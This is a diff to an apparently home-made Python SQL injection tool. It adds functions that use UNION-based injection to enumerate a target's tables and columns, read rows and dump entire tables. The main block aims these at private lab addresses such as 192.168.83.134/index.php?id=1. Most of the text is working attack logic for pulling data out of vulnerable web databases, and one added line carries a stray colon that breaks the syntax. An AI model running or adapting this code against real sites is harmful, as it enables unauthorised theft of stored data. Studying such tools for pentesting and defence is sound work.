@@ -95,6 +95,60 @@ def union_queries(page, query_params, num_cols, visible_nums, verbose):
 
     return results
 
+def tables(page, num_cols, visible_num, verbose):
+
+    query = builder.Builder(page, []).tables(num_cols, visible_num)
+    tables = injector.Injector(page, '').injection(query)
+    store = datastore.Store()
+    results = parser.Parser(store).tables(tables)
+
+    if verbose:
+        report = reporter.Reporter()
+        report.tables(results)
+
+    return results
+
+def columns(page, table, num_cols, visible_num, verbose):
+    """
+        :returns: List of columns in table.
+    """
+
+    query = builder.Builder(page, []).columns(table, num_cols, visible_num)
+    columns = injector.Injector(page, '').injection(query)
+    store = datastore.Store()
+    results = parser.Parser(store).columns(columns)
+
+    if verbose:
+        report = reporter.Reporter()
+        report.columns(results)
+
+    return results
+
+def rows(page, table, column, num_cols, visible_num, verbose):
+
+    query = builder.Builder(page, []).rows(table, column, num_cols, visible_num)
+    rows = injector.Injector(page, '').injection(query)
+    store = datastore.Store()
+    results = parser.Parser(store).rows(rows)
+
+    if verbose:
+        report = reporter.Reporter()
+        report.rows(results)
+
+    return results
+
+def dump_table(page, table, num_cols, visible_num, verbose):
+    """
+        :returns: Dict of Lists. Column->rows.
+    """
+
+    results = {}
+
+    for column in columns(page, table, num_cols, visible_num, False):
+        results[column] = rows(page, table, column, num_cols, visible_num, False)
+
+    return results
+
 def obfuscate_subquery(obfuscator, obfuscation, subquery):
     """ Takes subquery to obfuscate by encoding.
         :obfuscator:    Obfuscator object.
@@ -164,11 +218,14 @@ if __name__ == '__main__':
     page = 'http://192.168.83.134/index.php?id=1'
     #page = 'http://192.168.83.130/cat.php?id=1'
 
-    
+    # Get number of columns and which column to use for injection.
     num_cols = num_columns(page, False)
     visible_num = int(visible_nums(page, num_cols, False)[0])
 
-    x = union_queries(page, mysql_params, num_cols, visible_num, True)
+    tables = tables(page, num_cols, visible_num, False)
+    for table in tables:
+        dump_table(page, table, num_cols, visible_num, True):
+
 
     """
     x = build.comparative_precomputation()
